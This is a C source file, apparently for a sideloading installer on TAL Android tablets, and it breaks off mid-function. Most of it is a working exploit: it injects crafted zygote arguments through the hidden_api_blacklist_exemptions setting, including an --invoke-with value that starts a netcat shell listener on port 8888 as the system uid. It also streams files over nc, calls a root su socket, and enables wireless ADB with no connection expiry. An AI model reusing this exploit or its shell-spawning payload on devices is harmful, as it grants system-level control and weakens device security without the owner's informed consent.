/*
 * Copyright (C) 2026 yoyicue
 * SPDX-License-Identifier: GPL-3.0-only
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

extern const unsigned char xpad_dex_start[];
extern const unsigned char xpad_dex_end[];
extern const unsigned char xpad_anchor_start[];
extern const unsigned char xpad_anchor_end[];

#define SU_SOCKET "/data/local/tmp/temp_su.sock"
#define HIDDEN_SETTING "hidden_api_blacklist_exemptions"
#define INSTALL_WHITELIST "install_package_whitelist"
#define SYSTEM_DEX "/data/user/0/com.android.settings/cache/xpad-installer/embedded.dex"
#define SYSTEM_APK "/data/user/0/com.android.settings/cache/xpad-installer/staged.apk"
#define ROOT_DEX "/data/local/tmp/.xpad-installer.dex"
#define ZNXRUN_APK "/data/local/tmp/.xpad-znxrun.apk"
#define ANCHOR_APK "/data/local/tmp/.xpad-installer-anchor.apk"
#define ANCHOR_PACKAGE "com.yoyicue.xpad2.installeranchor"
#define OEM_INSTALLER "com.tal.pad.znxxservice"
#define ZNXRUN_ALIAS_LINE \
  "znxrun 10072 1 /data/user/0/com.tal.pad.znxxservice " \
  "default:targetSdkVersion=28 none 0 0 1 @null"
#define ZYGOTE_PORT 8888
#define TRANSFER_PORT 28889
#define ZYGOTE_WRITER_SIZE 8192
#define PAYLOAD_ENTRY_COUNT 3000
#define PRIMARY_TRIGGER_PACKAGE "com.android.settings"
#define PRIMARY_TRIGGER_ACTIVITY "com.android.settings/.Settings"
#define SECONDARY_TRIGGER_PACKAGE "com.tal.init.ota"
#define SECONDARY_TRIGGER_ACTIVITY "com.tal.init.ota/.MainActivity"

static volatile sig_atomic_t guarded_child = -1;

static void forward_guarded_signal(int signal_number) {
  pid_t child = (pid_t)guarded_child;
  if (child > 0) kill(child, signal_number);
}

static int write_all(int fd, const void *data, size_t len) {
  const unsigned char *p = data;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) return -1;
    p += n;
    len -= (size_t)n;
  }
  return 0;
}

static int write_file(const char *path, const void *data, size_t len, mode_t mode) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (fd < 0) return -1;
  int rc = write_all(fd, data, len);
  if (fchmod(fd, mode) != 0) rc = -1;
  if (close(fd) != 0) rc = -1;
  return rc;
}

static int copy_file(const char *source, const char *target, mode_t mode) {
  int in = open(source, O_RDONLY | O_CLOEXEC);
  if (in < 0) return -1;
  int out = open(target, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (out < 0) { close(in); return -1; }
  char buffer[65536];
  int rc = 0;
  for (;;) {
    ssize_t n = read(in, buffer, sizeof(buffer));
    if (n < 0 && errno == EINTR) continue;
    if (n < 0) { rc = -1; break; }
    if (n == 0) break;
    if (write_all(out, buffer, (size_t)n) != 0) { rc = -1; break; }
  }
  if (fchmod(out, mode) != 0) rc = -1;
  close(in); close(out); return rc;
}

static int connect_tcp(int port) {
  int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return -1;
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons((uint16_t)port);
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    close(fd);
    return -1;
  }
  return fd;
}

static void shell_quote(char *out, size_t cap, const char *value) {
  size_t used = 0;
#define PUT(ch) do { if (used + 1 >= cap) goto done; out[used++] = (ch); } while (0)
  PUT('\'');
  for (; *value; value++) {
    if (*value == '\'') {
      PUT('\''); PUT('\\'); PUT('\''); PUT('\'');
    } else PUT(*value);
  }
  PUT('\'');
done:
  out[used] = 0;
#undef PUT
}

static pid_t spawn_command(char *const argv[], int quiet) {
  pid_t pid = fork();
  if (pid < 0) return -1;
  if (pid == 0) {
    if (quiet) {
      int dev_null = open("/dev/null", O_RDWR | O_CLOEXEC);
      if (dev_null >= 0) {
        dup2(dev_null, STDOUT_FILENO);
        dup2(dev_null, STDERR_FILENO);
        if (dev_null > STDERR_FILENO) close(dev_null);
      }
    }
    execv(argv[0], argv);
    _exit(127);
  }
  return pid;
}

static int wait_command(pid_t pid) {
  if (pid < 0) return 127;
  int status = 0;
  while (waitpid(pid, &status, 0) < 0) {
    if (errno != EINTR) return 127;
  }
  return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(status);
}

static int run_command(char *const argv[]) {
  return wait_command(spawn_command(argv, 0));
}

static int capture_command(char *const argv[], char **output) {
  int pipes[2];
  if (pipe(pipes) != 0) return 127;
  pid_t pid = fork();
  if (pid < 0) {
    close(pipes[0]); close(pipes[1]);
    return 127;
  }
  if (pid == 0) {
    close(pipes[0]);
    dup2(pipes[1], STDOUT_FILENO);
    dup2(pipes[1], STDERR_FILENO);
    if (pipes[1] > STDERR_FILENO) close(pipes[1]);
    execv(argv[0], argv);
    _exit(127);
  }
  close(pipes[1]);
  size_t used = 0, capacity = 4096;
  char *buffer = malloc(capacity);
  if (!buffer) {
    close(pipes[0]);
    kill(pid, SIGKILL);
    wait_command(pid);
    return 70;
  }
  for (;;) {
    if (used + 2048 + 1 > capacity) {
      if (capacity >= 131072) {
        free(buffer); close(pipes[0]); kill(pid, SIGKILL); wait_command(pid);
        return 70;
      }
      capacity *= 2;
      char *grown = realloc(buffer, capacity);
      if (!grown) {
        free(buffer); close(pipes[0]); kill(pid, SIGKILL); wait_command(pid);
        return 70;
      }
      buffer = grown;
    }
    ssize_t count = read(pipes[0], buffer + used, capacity - used - 1);
    if (count < 0 && errno == EINTR) continue;
    if (count < 0) {
      free(buffer); close(pipes[0]); kill(pid, SIGKILL); wait_command(pid);
      return 74;
    }
    if (count == 0) break;
    used += (size_t)count;
  }
  close(pipes[0]);
  buffer[used] = 0;
  *output = buffer;
  return wait_command(pid);
}

static void trim_output(char *value) {
  size_t len = strlen(value);
  while (len && (value[len - 1] == '\n' || value[len - 1] == '\r' ||
                 value[len - 1] == ' ' || value[len - 1] == '\t'))
    value[--len] = 0;
}

struct whitelist_guard {
  char *original;
  int original_missing;
  int changed;
};

static int csv_contains(const char *csv, const char *item) {
  if (!csv || !*csv) return 0;
  size_t item_len = strlen(item);
  const char *cursor = csv;
  while (*cursor) {
    while (*cursor == ' ' || *cursor == ',') cursor++;
    const char *end = strchr(cursor, ',');
    if (!end) end = cursor + strlen(cursor);
    const char *trimmed = end;
    while (trimmed > cursor && trimmed[-1] == ' ') trimmed--;
    if ((size_t)(trimmed - cursor) == item_len && !strncmp(cursor, item, item_len))
      return 1;
    cursor = *end ? end + 1 : end;
  }
  return 0;
}

static int settings_get_global(const char *name, char **value, int *missing) {
  char *const argv[] = {
    "/system/bin/settings", "get", "global", (char *)name, NULL
  };
  char *output = NULL;
  int rc = capture_command(argv, &output);
  if (rc != 0) {
    free(output);
    return rc;
  }
  trim_output(output);
  *missing = !*output || !strcmp(output, "null");
  if (*missing) output[0] = 0;
  *value = output;
  return 0;
}

static int settings_set_global(const char *name, const char *value, int missing) {
  if (missing) {
    char *const argv[] = {
      "/system/bin/settings", "delete", "global", (char *)name, NULL
    };
    return run_command(argv);
  }
  char *const argv[] = {
    "/system/bin/settings", "put", "global", (char *)name, (char *)value, NULL
  };
  return run_command(argv);
}

static int prepare_whitelist(const char *package_name, struct whitelist_guard *guard) {
  memset(guard, 0, sizeof(*guard));
  int rc = settings_get_global(INSTALL_WHITELIST, &guard->original,
                               &guard->original_missing);
  if (rc != 0) {
    fprintf(stderr, "xpad-install: cannot read temporary installer whitelist\n");
    return rc;
  }
  if (!guard->original_missing && csv_contains(guard->original, package_name)) return 0;
  size_t original_len = guard->original_missing ? 0 : strlen(guard->original);
  size_t length = original_len + (original_len ? 1 : 0) + strlen(package_name) + 1;
  char *updated = malloc(length);
  if (!updated) return 70;
  snprintf(updated, length, "%s%s%s", original_len ? guard->original : "",
           original_len ? "," : "", package_name);
  rc = settings_set_global(INSTALL_WHITELIST, updated, 0);
  free(updated);
  if (rc != 0) {
    fprintf(stderr, "xpad-install: cannot prepare temporary installer whitelist\n");
    return rc;
  }
  guard->changed = 1;
  char *verified = NULL;
  int missing = 0;
  rc = settings_get_global(INSTALL_WHITELIST, &verified, &missing);
  int valid = rc == 0 && !missing && csv_contains(verified, package_name);
  free(verified);
  if (!valid) {
    fprintf(stderr, "xpad-install: temporary installer whitelist verification failed\n");
    return 1;
  }
  return 0;
}

static int restore_whitelist(struct whitelist_guard *guard) {
  int rc = 0;
  if (guard->changed) {
    rc = settings_set_global(INSTALL_WHITELIST, guard->original,
                             guard->original_missing);
    char *verified = NULL;
    int missing = 0;
    if (rc == 0) rc = settings_get_global(INSTALL_WHITELIST, &verified, &missing);
    if (rc == 0 && (missing != guard->original_missing ||
        (!missing && strcmp(verified, guard->original)))) rc = 1;
    free(verified);
  }
  free(guard->original);
  memset(guard, 0, sizeof(*guard));
  if (rc != 0)
    fprintf(stderr, "xpad-install: temporary installer whitelist restore failed\n");
  return rc;
}

static int znxrun_status(int print_status) {
  char *uid_output = NULL;
  char *const uid_argv[] = {
    "/system/bin/run-as", "znxrun", "/system/bin/id", "-u", NULL
  };
  int alias_rc = capture_command(uid_argv, &uid_output);
  if (uid_output) trim_output(uid_output);
  int alias_healthy = alias_rc == 0 && uid_output && !strcmp(uid_output, "10072");
  int alias_invalid = alias_rc == 0 && !alias_healthy;

  char *dump = NULL;
  char *const dump_argv[] = {
    "/system/bin/dumpsys", "package", ANCHOR_PACKAGE, NULL
  };
  int dump_rc = capture_command(dump_argv, &dump);
  const char *package_marker = "Package [" ANCHOR_PACKAGE "]";
  const char *expected_source = "installerPackageName=" OEM_INSTALLER "\n" ZNXRUN_ALIAS_LINE;
  int anchor_installed = dump_rc == 0 && dump && strstr(dump, package_marker);
  int anchor_persisted = anchor_installed && strstr(dump, expected_source);

  const char *status = alias_healthy && anchor_persisted ? "healthy" :
      alias_invalid ? "invalid" : alias_healthy ? "legacy" : "missing";
  const char *alias = alias_healthy ? "healthy" : alias_invalid ? "invalid" : "missing";
  const char *anchor = anchor_persisted ? "anchored" :
      anchor_installed ? "unanchored" : "missing";
  if (print_status) {
    printf("ZNXRUN_STATUS status=%s alias=%s uid=%s anchor=%s package=%s\n",
           status, alias, alias_healthy ? "10072" : "none", anchor, ANCHOR_PACKAGE);
  }
  free(uid_output);
  free(dump);
  return !strcmp(status, "healthy") ? 0 : 1;
}

static int sh(const char *command) {
  char *const argv[] = {"/system/bin/sh", "-c", (char *)command, NULL};
  return run_command(argv);
}

static int rpc(const char *command, int timeout_seconds) {
  int fd = connect_tcp(ZYGOTE_PORT);
  if (fd < 0) return 127;
  struct timeval tv = {.tv_sec = timeout_seconds, .tv_usec = 0};
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  char marker[80];
  snprintf(marker, sizeof(marker), "__XPAD_ELF_DONE_%d__", getpid());
  dprintf(fd, "%s; RC=$?; echo %s$RC\n", command, marker);
  shutdown(fd, SHUT_WR);
  char buffer[4096];
  char tail[256] = {0};
  int result = 124;
  for (;;) {
    ssize_t n = read(fd, buffer, sizeof(buffer));
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) break;
    write_all(STDOUT_FILENO, buffer, (size_t)n);
    size_t old = strlen(tail);
    size_t keep = (size_t)n < sizeof(tail) - old - 1 ? (size_t)n : sizeof(tail) - old - 1;
    memcpy(tail + old, buffer + n - keep, keep);
    tail[old + keep] = 0;
    if (strlen(tail) > 180) memmove(tail, tail + strlen(tail) - 180, 181);
    char *found = strstr(tail, marker);
    if (found) { result = atoi(found + strlen(marker)); break; }
  }
  close(fd);
  return result;
}

static char *build_zygote_payload(void) {
  const char *args[] = {
    "--runtime-args", "--setuid=1000", "--setgid=1000", "--setgroups=3003",
    "--mount-external-android-writable", "--runtime-flags=43267",
    "--target-sdk-version=29",
    "--seinfo=platform:system_app:targetSdkVersion=29:complete", "--invoke-with",
    "(toybox nc -s 127.0.0.1 -p 8888 -L /system/bin/sh -l)&",
    "--package-name=com.android.settings", "android.app.ActivityThread"
  };
  const size_t argument_count = sizeof(args) / sizeof(args[0]);
  char command[2048];
  int used = snprintf(command, sizeof(command), "%zu\n",
                      argument_count + PAYLOAD_ENTRY_COUNT);
  if (used < 0 || (size_t)used >= sizeof(command)) return NULL;
  for (size_t i = 0; i < argument_count; i++) {
    int count = snprintf(command + used, sizeof(command) - (size_t)used, "%s%s", args[i],
                         i + 1 == argument_count ? "" : "\n");
    if (count < 0 || (size_t)count >= sizeof(command) - (size_t)used) return NULL;
    used += count;
  }

  int prefix = snprintf(NULL, 0, "%d\n--set-api-denylist-exemptions\n",
                        PAYLOAD_ENTRY_COUNT + 1);
  if (prefix < 0 || (size_t)prefix + PAYLOAD_ENTRY_COUNT >= ZYGOTE_WRITER_SIZE) return NULL;
  size_t padding = ZYGOTE_WRITER_SIZE - (size_t)prefix - PAYLOAD_ENTRY_COUNT;
  size_t total = PAYLOAD_ENTRY_COUNT + padding + (size_t)used
      + (PAYLOAD_ENTRY_COUNT - 1) + 1;
  char *payload = malloc(total + 1);
  if (!payload) return NULL;
  char *p = payload;
  memset(p, '\n', PAYLOAD_ENTRY_COUNT); p += PAYLOAD_ENTRY_COUNT;
  memset(p, 'A', padding); p += padding;
  memcpy(p, command, (size_t)used); p += used;
  for (int i = 1; i < PAYLOAD_ENTRY_COUNT; i++) *p++ = ',';
  *p++ = 'X';
  *p = 0;
  return payload;
}

static int settings_put(const char *payload) {
  char *const argv[] = {
    "/system/bin/settings", "put", "global", HIDDEN_SETTING, (char *)payload, NULL
  };
  return wait_command(spawn_command(argv, 1));
}

static void force_stop_package(const char *package_name) {
  char *const argv[] = {
    "/system/bin/am", "force-stop", (char *)package_name, NULL
  };
  wait_command(spawn_command(argv, 1));
}

static void start_alignment_triggers(void) {
  char *const primary[] = {
    "/system/bin/am", "start", "-n", PRIMARY_TRIGGER_ACTIVITY, NULL
  };
  char *const secondary[] = {
    "/system/bin/am", "start", "-n", SECONDARY_TRIGGER_ACTIVITY, NULL
  };
  pid_t primary_pid = spawn_command(primary, 1);
  pid_t secondary_pid = spawn_command(secondary, 1);
  int primary_status = wait_command(primary_pid);
  int secondary_status = wait_command(secondary_pid);
  fprintf(stderr, "xpad-install: zygote alignment primary=%d secondary=%d\n",
          primary_status, secondary_status);
}

static void cleanup_31317(void) {
  char *const argv[] = {
    "/system/bin/settings", "delete", "global", HIDDEN_SETTING, NULL
  };
  wait_command(spawn_command(argv, 1));
}

static void cleanup_system_runner(void) {
  int fd = connect_tcp(ZYGOTE_PORT);
  if (fd < 0) return;
  const char command[] =
      "ME=$$; PARENT=$PPID; GP=$(awk '/^PPid:/ {print $2}' /proc/$PARENT/status 2>/dev/null); "
      "rm -f " SYSTEM_DEX "; settings delete global " HIDDEN_SETTING " >/dev/null 2>&1; "
      "kill -9 $GP $PARENT >/dev/null 2>&1\n";
  write_all(fd, command, sizeof(command) - 1);
  shutdown(fd, SHUT_WR);
  close(fd);
  sleep(1);
}

static int acquire_31317(void) {
  int existing = connect_tcp(ZYGOTE_PORT);
  if (existing >= 0) { close(existing); return 0; }
  char *payload = build_zygote_payload();
  if (!payload) return -1;
  for (int attempt = 1; attempt <= 3; attempt++) {
    cleanup_31317();
    force_stop_package(PRIMARY_TRIGGER_PACKAGE);
    force_stop_package(SECONDARY_TRIGGER_PACKAGE);
    if (settings_put(payload) != 0) {
      cleanup_31317();
      free(payload);
      return -1;
    }
    start_alignment_triggers();
    for (int i = 0; i < 12; i++) {
      int fd = connect_tcp(ZYGOTE_PORT);
      if (fd >= 0) {
        close(fd);
        cleanup_31317();
        force_stop_package(PRIMARY_TRIGGER_PACKAGE);
        force_stop_package(SECONDARY_TRIGGER_PACKAGE);
        free(payload);
        return 0;
      }
      sleep(1);
    }
    fprintf(stderr, "xpad-install: 31317 attempt %d failed\n", attempt);
  }
  cleanup_31317();
  free(payload);
  return -1;
}

static int transfer_dex_to_system(void) {
  char command[1024];
  snprintf(command, sizeof(command),
           "P=%s; export P; mkdir -p \"${P%%/*}\"; rm -f \"$P\" \"$P.pid\"; "
           "toybox nc -s 127.0.0.1 -p %d -L /system/bin/sh -c 'cat > \"$P\"' & echo $! > \"$P.pid\"",
           SYSTEM_DEX, TRANSFER_PORT);
  if (rpc(command, 10) != 0) return -1;
  int fd = -1;
  for (int i = 0; i < 30 && fd < 0; i++) { usleep(100000); fd = connect_tcp(TRANSFER_PORT); }
  if (fd < 0) return -1;
  size_t size = (size_t)(xpad_dex_end - xpad_dex_start);
  int rc = write_all(fd, xpad_dex_start, size);
  shutdown(fd, SHUT_WR); close(fd); usleep(500000);
  snprintf(command, sizeof(command),
           "kill $(cat %s.pid) 2>/dev/null; rm -f %s.pid; test $(stat -c %%s %s) -eq %zu",
           SYSTEM_DEX, SYSTEM_DEX, SYSTEM_DEX, size);
  return rc == 0 && rpc(command, 10) == 0 ? 0 : -1;
}

static int transfer_apk_to_system(const char *local_path) {
  int input = open(local_path, O_RDONLY | O_CLOEXEC);
  if (input < 0) return -1;
  char command[1024];
  snprintf(command, sizeof(command),
           "P=%s; export P; mkdir -p \"${P%%/*}\"; rm -f \"$P\" \"$P.pid\"; "
           "toybox nc -s 127.0.0.1 -p %d -L /system/bin/sh -c 'cat > \"$P\"' & echo $! > \"$P.pid\"",
           SYSTEM_APK, TRANSFER_PORT);
  if (rpc(command, 10) != 0) { close(input); return -1; }
  int fd = -1;
  for (int i = 0; i < 30 && fd < 0; i++) { usleep(100000); fd = connect_tcp(TRANSFER_PORT); }
  if (fd < 0) { close(input); return -1; }
  char buffer[65536];
  off_t total = 0;
  int rc = 0;
  for (;;) {
    ssize_t n = read(input, buffer, sizeof(buffer));
    if (n < 0 && errno == EINTR) continue;
    if (n < 0) { rc = -1; break; }
    if (n == 0) break;
    if (write_all(fd, buffer, (size_t)n) != 0) { rc = -1; break; }
    total += n;
  }
  close(input); shutdown(fd, SHUT_WR); close(fd); usleep(500000);
  snprintf(command, sizeof(command),
           "kill $(cat %s.pid) 2>/dev/null; rm -f %s.pid; test $(stat -c %%s %s) -eq %lld",
           SYSTEM_APK, SYSTEM_APK, SYSTEM_APK, (long long)total);
  return rc == 0 && rpc(command, 10) == 0 ? 0 : -1;
}

static int exec_java(const char *dex_path, int argc, char **argv) {
  char cp[512], dexenv[512];
  snprintf(cp, sizeof(cp), "CLASSPATH=%s:/system/app/pad2_znxxservice/pad2_znxxservice.apk", dex_path);
  snprintf(dexenv, sizeof(dexenv), "XPAD_EMBEDDED_DEX=%s", dex_path);
  setenv("CLASSPATH", cp + strlen("CLASSPATH="), 1);
  setenv("XPAD_EMBEDDED_DEX", dexenv + strlen("XPAD_EMBEDDED_DEX="), 1);
  char **child = calloc((size_t)argc + 4, sizeof(char *));
  if (!child) return 70;
  int n = 0;
  child[n++] = "/system/bin/app_process"; child[n++] = "/"; child[n++] = "XpadInstaller";
  for (int i = 0; i < argc; i++) child[n++] = argv[i];
  child[n] = NULL;
  execv(child[0], child);
  return 70;
}

static int run_embedded_java(int argc, char **argv) {
  if (write_file(ROOT_DEX, xpad_dex_start,
                 (size_t)(xpad_dex_end - xpad_dex_start), 0444) != 0) return 74;
  pid_t pid = fork();
  if (pid < 0) {
    unlink(ROOT_DEX);
    return 70;
  }
  if (pid == 0) _exit(exec_java(ROOT_DEX, argc, argv));
  int rc = wait_command(pid);
  unlink(ROOT_DEX);
  return rc;
}

static int configure_autostart(void) {
  char *const grant[] = {
    "/system/bin/pm", "grant", "com.yoyicue.boominstaller",
    "android.permission.WRITE_SECURE_SETTINGS", NULL
  };
  if (run_command(grant) != 0) {
    fprintf(stderr, "xpad-install: cannot grant BoomInstaller WRITE_SECURE_SETTINGS\n");
    return 77;
  }
  char *const adb_enabled[] = {
    "/system/bin/settings", "put", "global", "adb_enabled", "1", NULL
  };
  char *const wifi_enabled[] = {
    "/system/bin/settings", "put", "global", "adb_wifi_enabled", "1", NULL
  };
  char *const no_expiry[] = {
    "/system/bin/settings", "put", "global", "adb_allowed_connection_time", "0", NULL
  };
  if (run_command(adb_enabled) != 0 || run_command(wifi_enabled) != 0
      || run_command(no_expiry) != 0) {
    fprintf(stderr, "xpad-install: cannot configure wireless ADB for auto-start\n");
    return 77;
  }
  char *args[] = {"autostart", "enable"};
  int rc = run_embedded_java(2, args);
  if (rc != 0) {
    fprintf(stderr, "xpad-install: BoomInstaller auto-start setup failed\n");
    return rc;
  }
  /* AdbDebuggingManager tears the pairing server down asynchronously. */
  sleep(15);
  char *const wifi_disabled[] = {
    "/system/bin/settings", "put", "global", "adb_wifi_enabled", "0", NULL
  };
  if (run_command(wifi_disabled) != 0) {
    fprintf(stderr, "xpad-install: cannot restart wireless ADB after pairing\n");
    return 77;
  }
  sleep(2);
  if (run_command(wifi_enabled) != 0) {
    fprintf(stderr, "xpad-install: cannot restart wireless ADB after pairing\n");
    return 77;
  }
  puts("autostart=enabled");
  return 0;
}

static int run_java_as_znxrun(int argc, char **argv) {
  char *const probe[] = {"/system/bin/run-as", "znxrun", "/system/bin/true", NULL};
  if (run_command(probe) != 0) return -1;
  int apk_index = argc >= 2 &&
      (!strcmp(argv[0], "install") || !strcmp(argv[0], "upgrade")) ? argc - 1 : -1;
  char **effective_argv = argv;
  if (apk_index >= 0) {
    if (copy_file(argv[apk_index], ZNXRUN_APK, 0444) != 0) return 74;
    effective_argv = calloc((size_t)argc, sizeof(char *));
    if (!effective_argv) {
      unlink(ZNXRUN_APK);
      return 70;
    }
    for (int i = 0; i < argc; i++) effective_argv[i] = argv[i];
    effective_argv[apk_index] = ZNXRUN_APK;
  }
  if (write_file(ROOT_DEX, xpad_dex_start,
                 (size_t)(xpad_dex_end - xpad_dex_start), 0444) != 0) {
    free(effective_argv == argv ? NULL : effective_argv);
    unlink(ZNXRUN_APK);
    return 74;
  }

  char command[16384];
  int used = snprintf(command, sizeof(command),
      "CLASSPATH=" ROOT_DEX ":/system/app/pad2_znxxservice/pad2_znxxservice.apk "
      "XPAD_EMBEDDED_DEX=" ROOT_DEX " XPAD_TRANSPORT=0044 "
      "/system/bin/app_process / XpadInstaller");
  if (used < 0 || (size_t)used >= sizeof(command)) {
    unlink(ROOT_DEX);
    unlink(ZNXRUN_APK);
    free(effective_argv == argv ? NULL : effective_argv);
    return 64;
  }
  for (int i = 0; i < argc; i++) {
    char quoted[4096];
    shell_quote(quoted, sizeof(quoted), effective_argv[i]);
    size_t need = 1 + strlen(quoted);
    if ((size_t)used + need >= sizeof(command)) {
      unlink(ROOT_DEX);
      unlink(ZNXRUN_APK);
      free(effective_argv == argv ? NULL : effective_argv);
      return 64;
    }
    command[used++] = ' ';
    memcpy(command + used, quoted, strlen(quoted) + 1);
    used += (int)strlen(quoted);
  }

  char *const child[] = {
    "/system/bin/run-as", "znxrun", "/system/bin/sh", "-c", command, NULL
  };
  int rc = run_command(child);
  unlink(ROOT_DEX);
  unlink(ZNXRUN_APK);
  free(effective_argv == argv ? NULL : effective_argv);
  return rc;
}

static int apk_arg_index(int argc, char **argv) {
  if (argc >= 2 && (!strcmp(argv[0], "install") || !strcmp(argv[0], "upgrade")))
    return argc - 1;
  if (argc >= 4 && !strcmp(argv[0], "znxrun") &&
      (!strcmp(argv[1], "create") || !strcmp(argv[1], "ensure"))) {
    for (int i = 2; i + 1 < argc; i++) if (!strcmp(argv[i], "--apk")) return i + 1;
  }
  return -1;
}

static int parse_service_args(int argc, char **argv, const char **starter, const char **apk) {
  *starter = NULL;
  *apk = NULL;
  for (int i = 1; i < argc; i++) {
    if (!strncmp(argv[i], "--starter=", 10)) {
      *starter = argv[i] + 10;
    } else if (!strncmp(argv[i], "--apk=", 6)) {
      *apk = argv[i] + 6;
    } else {
      fprintf(stderr, "xpad-install: unknown service argument: %s\n", argv[i]);
      return 64;
    }
  }
  if (!*starter || !**starter || !*apk || !**apk) {
    fprintf(stderr, "xpad-install: activate requires --starter=PATH and --apk=PATH\n");
    return 64;
  }
  struct stat st;
  if (stat(*starter, &st) != 0 || !S_ISREG(st.st_mode) || access(*starter, R_OK | X_OK) != 0) {
    fprintf(stderr, "xpad-install: starter is not executable: %s\n", *starter);
    return 66;
  }
  if (stat(*apk, &st) != 0 || !S_ISREG(st.st_mode) || access(*apk, R_OK) != 0) {
    fprintf(stderr, "xpad-install: manager APK is not readable: %s\n", *apk);
    return 66;
  }
  return 0;
}

static int serve(int argc, char **argv) {
  const char *starter, *apk;
  int rc = parse_service_args(argc, argv, &starter, &apk);
  if (rc != 0) return rc;
  uid_t uid = getuid();
  if (uid != 0 && uid != 1000 && uid != 10072) {
    fprintf(stderr, "xpad-install: serve requires uid 0, 1000, or 10072 (current uid=%d)\n", uid);
    return 77;
  }
  char apk_arg[2048];
  if (snprintf(apk_arg, sizeof(apk_arg), "--apk=%s", apk) >= (int)sizeof(apk_arg)) return 64;
  char *const child[] = {(char *)starter, apk_arg, NULL};
  execv(starter, child);
  fprintf(stderr, "xpad-install: cannot execute starter %s: %s\n", starter, strerror(errno));
  return 126;
}

static int activate_as_znxrun(int argc, char **argv) {
  char *const probe[] = {"/system/bin/run-as", "znxrun", "/system/bin/true", NULL};
  if (run_command(probe) != 0) return -1;
  if (sh("dumpsys package com.tal.pad.znxxservice | "
         "grep -q 'android.permission.ACCESS_CONTENT_PROVIDERS_EXTERNALLY: granted=true'") != 0) {
    fprintf(stderr,
            "xpad-install: uid 10072 cannot deliver Binder on this firmware; using uid 1000\n");
    return -1;
  }

  const char *starter, *apk;
  int rc = parse_service_args(argc, argv, &starter, &apk);
  if (rc != 0) return rc;
  char apk_arg[2048];
  if (snprintf(apk_arg, sizeof(apk_arg), "--apk=%s", apk) >= (int)sizeof(apk_arg)) return 64;
  fprintf(stderr, "xpad-install: activating BoomInstaller as uid 10072 (0044)\n");
  char *const child[] = {
      "/system/bin/run-as", "znxrun", (char *)starter, apk_arg, NULL
  };
  return run_command(child);
}

static int activate_as_system(int argc, char **argv) {
  const char *starter, *apk;
  int rc = parse_service_args(argc, argv, &starter, &apk);
  if (rc != 0) return rc;
  if (acquire_31317() != 0) return 77;

  char quoted_starter[4096], apk_arg[2048], quoted_apk[4096], command[8192];
  if (snprintf(apk_arg, sizeof(apk_arg), "--apk=%s", apk) >= (int)sizeof(apk_arg)) {
    cleanup_system_runner();
    cleanup_31317();
    return 64;
  }
  shell_quote(quoted_starter, sizeof(quoted_starter), starter);
  shell_quote(quoted_apk, sizeof(quoted_apk), apk_arg);
  snprintf(command, sizeof(command), "%s %s", quoted_starter, quoted_apk);
  fprintf(stderr, "xpad-install: activating BoomInstaller as uid 1000 (31317)\n");
  rc = rpc(command, 60);
  cleanup_system_runner();
  cleanup_31317();
  return rc;
}

static int ionstack_root_java(int argc, char **argv) {
  if (getuid() != 0) return 77;
  FILE *enforce = fopen("/sys/fs/selinux/enforce", "r");
  int enforcing = enforce ? fgetc(enforce) == '1' : 1;
  if (enforce) fclose(enforce);
  if (enforcing) {
    fprintf(stderr, "xpad-install: IonStack root transport requires SELinux disabled\n");
    return 77;
  }
  if (write_file(ROOT_DEX, xpad_dex_start, (size_t)(xpad_dex_end - xpad_dex_start), 0444) != 0)
    return 74;
  int apk_index = apk_arg_index(argc, argv);
  int has_apk = apk_index >= 0;
  char **args = argv;
  if (has_apk) {
    if (!strcmp(argv[0], "install") || !strcmp(argv[0], "upgrade"))
      setenv("XPAD_PROVIDER_APK", argv[apk_index], 1);
    if (copy_file(argv[apk_index], "/data/local/tmp/.xpad-installer.apk", 0444) != 0) return 74;
    args = calloc((size_t)argc + 1, sizeof(char *));
    if (!args) return 70;
    for (int i = 0; i < argc; i++) args[i] = argv[i];
    args[apk_index] = "/data/local/tmp/.xpad-installer.apk";
  }
  setenv("XPAD_TRANSPORT", "ionstack-root", 1);
  if (setgid(1000) != 0 || setuid(1000) != 0) return 77;
  return exec_java(ROOT_DEX, argc, args);
}

static int ionstack_delegate(int argc, char **argv) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return -1;
  struct sockaddr_un addr; memset(&addr, 0, sizeof(addr)); addr.sun_family = AF_UNIX;
  snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", SU_SOCKET);
  if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) { close(fd); return -1; }
  char command[8192] = {0}, quoted[2048];
  shell_quote(quoted, sizeof(quoted), argv[0]);
  snprintf(command, sizeof(command), "%s --root-child", quoted);
  for (int i = 1; i < argc; i++) {
    shell_quote(quoted, sizeof(quoted), argv[i]);
    strlcat(command, " ", sizeof(command)); strlcat(command, quoted, sizeof(command));
  }
  strlcat(command,
          "; RC=$?; rm -f /data/local/tmp/.xpad-installer.dex /data/local/tmp/.xpad-installer.apk; "
          "echo __XPAD_IONSTACK_RC__$RC; exit $RC",
          sizeof(command));
  char mode = 'C'; uint32_t len = (uint32_t)strlen(command);
  write_all(fd, &mode, 1); write_all(fd, &len, sizeof(len)); write_all(fd, command, len);
  shutdown(fd, SHUT_WR);
  char buffer[4096], tail[256] = {0};
  for (;;) {
    ssize_t n = read(fd, buffer, sizeof(buffer));
    if (n <= 0) break;
    write_all(1, buffer, (size_t)n);
    size_t keep = (size_t)n < sizeof(tail) - 1 ? (size_t)n : sizeof(tail) - 1;
    memcpy(tail, buffer + n - keep, keep); tail[keep] = 0;
  }
  close(fd);
